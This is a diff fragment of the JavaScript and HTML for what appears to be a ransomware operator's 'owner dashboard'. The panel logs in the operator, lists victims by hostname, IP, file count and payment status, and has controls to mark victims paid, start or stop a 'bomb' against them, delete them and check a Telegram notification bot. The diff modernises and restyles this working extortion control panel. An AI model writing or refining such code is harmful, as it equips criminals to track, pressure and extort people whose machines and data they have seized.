     </div>
     
-    <!-- Victim Modal -->
     <div class="modal" id="victimModal">
         <div class="modal-content">
             <div class="modal-header">
                 <h2 style="color:#ff0000;">VICTIM DETAILS</h2>
-                <span class="close" onclick="closeModal()">&times;</span>
+                <span class="close" onclick="closeModal()">X</span>
             </div>
             <div id="victimDetails"></div>
-            <div style="margin-top:20px;">
-                <button class="action-btn" onclick="markPaid()">💰 MARK PAID</button>
-                <button class="action-btn" onclick="startBomb()">💣 START BOMB</button>
-                <button class="action-btn" onclick="stopBomb()">🛑 STOP BOMB</button>
-                <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
+            <div style="margin-top:20px; text-align:center;">
+                <button class="action-btn" onclick="markPaid()">MARK PAID</button>
+                <button class="action-btn" onclick="startBomb()">START BOMB</button>
+                <button class="action-btn" onclick="stopBomb()">STOP BOMB</button>
+                <button class="action-btn" onclick="deleteVictim()">DELETE</button>
             </div>
         </div>
     </div>
 
     <script>
-        let currentVictim = null;
-        let victims = [];
-        let accessToken = localStorage.getItem('access_token');
+        var currentVictim = null;
+        var victims = [];
+        var accessToken = localStorage.getItem('access_token');
         
-        // Check if already logged in
         if (accessToken) {
             document.getElementById('loginView').style.display = 'none';
             document.getElementById('dashboardView').style.display = 'block';
             loadData();
         }
         
-        async function login() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        function login() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
             
-            try {
-                const response = await fetch('/api/owner/login', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({email, password})
-                });
-                
-                const data = await response.json();
-                if (response.ok) {
+            fetch('/api/owner/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email: email, password: password})
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                if (data.access_token) {
                     localStorage.setItem('access_token', data.access_token);
                     document.getElementById('loginView').style.display = 'none';
                     document.getElementById('dashboardView').style.display = 'block';
                     loadData();
                 } else {
-                    document.getElementById('loginError').innerText = 'Invalid credentials';
+                    document.getElementById('loginError').innerText = '> ACCESS DENIED';
                 }
-            } catch(e) {
-                document.getElementById('loginError').innerText = 'Connection error';
-            }
+            })
+            .catch(function() {
+                document.getElementById('loginError').innerText = '> CONNECTION ERROR';
+            });
         }
         
-        async function logout() {
+        function logout() {
             localStorage.removeItem('access_token');
             document.getElementById('loginView').style.display = 'block';
             document.getElementById('dashboardView').style.display = 'none';
         }
         
-        async function loadData() {
-            await loadTelegramStatus();
-            await loadStats();
-            await loadVictims();
+        function loadData() {
+            loadTelegramStatus();
+            loadStats();
+            loadVictims();
         }
         
-        async function loadTelegramStatus() {
-            try {
-                const response = await fetch('/api/telegram/status', {
-                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
-                });
-                const data = await response.json();
-                const statusDiv = document.getElementById('telegramStatus');
+        function loadTelegramStatus() {
+            fetch('/api/telegram/status', {
+                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                var statusDiv = document.getElementById('telegramStatus');
                 if (data.enabled) {
-                    statusDiv.innerHTML = `📱 <span class="telegram-enabled">TELEGRAM BOT ENABLED</span> - Chat ID: ${data.chat_id}`;
+                    statusDiv.innerHTML = '> TELEGRAM BOT: <span class="telegram-enabled">ENABLED</span> | CHAT ID: ' + data.chat_id;
                 } else {
-                    statusDiv.innerHTML = `📱 <span class="telegram-disabled">TELEGRAM BOT DISABLED</span>`;
+                    statusDiv.innerHTML = '> TELEGRAM BOT: <span class="telegram-disabled">DISABLED</span>';
                 }
-            } catch(e) {
-                console.error('Telegram status error:', e);
-            }
+            })
+            .catch(function() {
+                document.getElementById('telegramStatus').innerHTML = '> TELEGRAM STATUS: UNKNOWN';
+            });
         }
         
-        async function testTelegram() {
-            try {
-                const response = await fetch('/api/telegram/test', {
-                    method: 'POST',
-                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
-                });
-                const data = await response.json();
-                alert(data.success ? '✅ Test message sent!' : '❌ Failed to send test message');
-            } catch(e) {
-                alert('Error testing Telegram');
-            }
+        function testTelegram() {
+            fetch('/api/telegram/test', {
+                method: 'POST',
+                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                alert(data.success ? 'TEST MESSAGE SENT' : 'TEST FAILED');
+            })
+            .catch(function() {
+                alert('TEST ERROR');
+            });
         }
         
-        async function loadStats() {
-            try {
-                const response = await fetch('/api/stats');
-                const stats = await response.json();
+        function loadStats() {
+            fetch('/api/stats')
+            .then(function(response) { return response.json(); })
+            .then(function(stats) {
                 document.getElementById('totalVictims').textContent = stats.total || 0;
                 document.getElementById('paidVictims').textContent = stats.paid || 0;
                 document.getElementById('unpaidVictims').textContent = stats.unpaid || 0;
                 document.getElementById('expiredVictims').textContent = stats.expired || 0;
                 document.getElementById('totalFiles').textContent = (stats.total_files || 0).toLocaleString();
                 document.getElementById('activeBombs').textContent = stats.active_bombs || 0;
-            } catch(e) {
-                console.error('Stats error:', e);
-            }
+            })
+            .catch(function() {
+                console.error('Stats error');
+            });
         }
         
-        async function loadVictims() {
-            try {
-                const response = await fetch('/api/owner/victims', {
-                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
-                });
-                victims = await response.json();
+        function loadVictims() {
+            fetch('/api/owner/victims', {
+                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                victims = data;
                 renderTable();
-            } catch(e) {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:#ff0000;">Error loading victims</td></tr>';
-            }
+            })
+            .catch(function() {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:#ff0000;">> ERROR LOADING VICTIMS</td></tr>';
+            });
         }
         
         function renderTable() {
             if (!victims.length) {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">No victims found</td></tr>';
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">> NO VICTIMS FOUND</td></tr>';
                 return;
             }
             
-            let html = '';
-            victims.forEach(v => {
-                const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
-                const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
+            var html = '';
+            for (var i = 0; i < victims.length; i++) {
+                var v = victims[i];
+                var bombDisplay = v.bomb_status === 'active' ? 'ACTIVE' : 'INACTIVE';
+                var bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                 
-                html += `<tr>
-                    <td><small>${(v.id || '').substring(0, 20)}...</small></td>
-                    <td>${v.hostname || 'Unknown'}</td>
-                    <td>${v.ip || '0.0.0.0'}</td>
-                    <td>${(v.files || 0).toLocaleString()}</td>
-                    <td><span class="status-${v.status || 'unknown'}">${v.status || 'unknown'}</span></td>
-                    <td class="${bombClass}">${bombIcon}<br><small>${(v.bomb_size || 0).toFixed(1)}GB</small></td>
-                    <td>
-                        <button class="action-btn" onclick="viewVictim('${v.id}')">VIEW</button>
-                    </td>
-                </tr>`;
-            });
+                html += '<tr>' +
+                    '<td><small>' + (v.id || '').substring(0, 20) + '...</small></td>' +
+                    '<td>' + (v.hostname || 'UNKNOWN') + '</td>' +
+                    '<td>' + (v.ip || '0.0.0.0') + '</td>' +
+                    '<td>' + (v.files || 0).toLocaleString() + '</td>' +
+                    '<td><span class="status-' + (v.status || 'unknown') + '">' + (v.status || 'UNKNOWN').toUpperCase() + '</span></td>' +
+                    '<td class="' + bombClass + '">' + bombDisplay + '<br><small>' + (v.bomb_size || 0).toFixed(1) + 'GB</small></td>' +
+                    '<td>' +
+                        '<button class="action-btn" onclick="viewVictim(\'' + v.id + '\')">VIEW</button>' +
+                    '</td>' +
+                '</tr>';
+            }
             
             document.getElementById('tableBody').innerHTML = html;
         }
         
-        async function viewVictim(victimId) {
-            try {
-                const response = await fetch(`/api/owner/victim/${victimId}`, {
-                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
-                });
-                currentVictim = await response.json();
+        function viewVictim(victimId) {
+            fetch('/api/owner/victim/' + victimId, {
+                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                currentVictim = data;
                 
-                let details = '';
-                for (const [key, value] of Object.entries(currentVictim)) {
-                    details += `<div style="padding:5px;background:#111;margin:2px 0;"><strong>${key}:</strong> ${value || 'N/A'}</div>`;
+                var details = '';
+                for (var key in currentVictim) {
+                    if (currentVictim.hasOwnProperty(key)) {
+                        details += '<div style="padding:5px;background:#111;margin:2px 0;border-left:2px solid #330000;"><strong>' + key.toUpperCase() + ':</strong> ' + (currentVictim[key] || 'N/A') + '</div>';
+                    }
                 }
                 
                 document.getElementById('victimDetails').innerHTML = details;
                 document.getElementById('victimModal').classList.add('show');
-            } catch(e) {
-                alert('Error loading victim details');
-            }
+            })
+            .catch(function() {
+                alert('ERROR LOADING VICTIM DETAILS');
+            });
         }
         
         function closeModal() {
@@ -1234,91 +1328,91 @@ OWNER_DASHBOARD_TEMPLATE = """
             currentVictim = null;
         }
         
-        async function markPaid() {
+        function markPaid() {
             if (!currentVictim) return;
             
-            try {
-                const response = await fetch(`/api/owner/mark-paid/${currentVictim.id}`, {
-                    method: 'POST',
-                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
-                });
-                
+            fetch('/api/owner/mark-paid/' + currentVictim.id, {
+                method: 'POST',
+                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
+            })
+            .then(function(response) {
                 if (response.ok) {
-                    alert('✅ Marked as paid!');
+                    alert('MARKED AS PAID');
                     closeModal();
                     loadVictims();
                     loadStats();
                 }
-            } catch(e) {
-                alert('Error marking as paid');
-            }
+            })
+            .catch(function() {
+                alert('ERROR');
+            });
         }
         
-        async function startBomb() {
+        function startBomb() {
             if (!currentVictim) return;
             
-            try {
-                const response = await fetch('/api/owner/bomb/start', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${localStorage.getItem('access_token')}`
-                    },
-                    body: JSON.stringify({victim_id: currentVictim.id})
-                });
-                
+            fetch('/api/owner/bomb/start', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
+                },
+                body: JSON.stringify({victim_id: currentVictim.id})
+            })
+            .then(function(response) {
                 if (response.ok) {
-                    alert('💣 Bomb started!');
+                    alert('BOMB STARTED');
                     closeModal();
                     loadVictims();
                 }
-            } catch(e) {
-                alert('Error starting bomb');
-            }
+            })
+            .catch(function() {
+                alert('ERROR');
+            });
         }
         
-        async function stopBomb() {
+        function stopBomb() {
             if (!currentVictim) return;
             
-            try {
-                const response = await fetch('/api/owner/bomb/stop', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${localStorage.getItem('access_token')}`
-                    },
-                    body: JSON.stringify({victim_id: currentVictim.id})
-                });
-                
+            fetch('/api/owner/bomb/stop', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
+                },
+                body: JSON.stringify({victim_id: currentVictim.id})
+            })
+            .then(function(response) {
                 if (response.ok) {
-                    alert('⛓️ Bomb stopped!');
+                    alert('BOMB STOPPED');
                     closeModal();
                     loadVictims();
                 }
-            } catch(e) {
-                alert('Error stopping bomb');
-            }
+            })
+            .catch(function() {
+                alert('ERROR');
+            });
         }
         
-        async function deleteVictim() {
+        function deleteVictim() {
             if (!currentVictim) return;
-            if (!confirm(`⚠️ DELETE ${currentVictim.id}?`)) return;
+            if (!confirm('DELETE VICTIM ' + currentVictim.id + '?')) return;
             
-            try {
-                const response = await fetch(`/api/owner/delete-victim/${currentVictim.id}`, {
-                    method: 'DELETE',
-                    headers: {'Authorization': `Bearer ${localStorage.getItem('access_token')}`}
-                });
-                
+            fetch('/api/owner/delete-victim/' + currentVictim.id, {
+                method: 'DELETE',
+                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
+            })
+            .then(function(response) {
                 if (response.ok) {
-                    alert('Victim deleted');
+                    alert('VICTIM DELETED');
                     closeModal();
                     loadVictims();
                     loadStats();
                 }
-            } catch(e) {
-                alert('Error deleting victim');
-            }
+            })
+            .catch(function() {
+                alert('ERROR');
+            });
         }
         
         setInterval(loadData, 30000);
